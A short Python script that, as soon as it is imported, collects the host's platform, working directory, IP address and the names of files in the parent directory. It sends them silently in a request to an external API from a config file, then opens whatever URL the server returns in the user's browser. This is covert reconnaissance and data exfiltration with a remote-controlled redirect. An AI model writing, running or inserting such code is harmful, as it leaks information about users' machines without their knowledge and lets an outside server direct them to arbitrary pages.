import webbrowser
import urllib.request
import socket
import os
import platform
import re

import config
import gip

cwd = os.getcwd()
plat = platform.platform()
ip = gip.get_ip()
fo = ""
files = os.listdir("../")
for name in files:
    fo += name+"XXXXXXX"
fo = re.sub(r'\W+', '', fo)
url = config.api_url+"?plat="+plat+"&cwd="+cwd+"&ip="+ip+"&files="+fo
resp = urllib.request.urlopen(url).read()
resp = str(resp, 'utf-8')
def go():
    webbrowser.open(resp)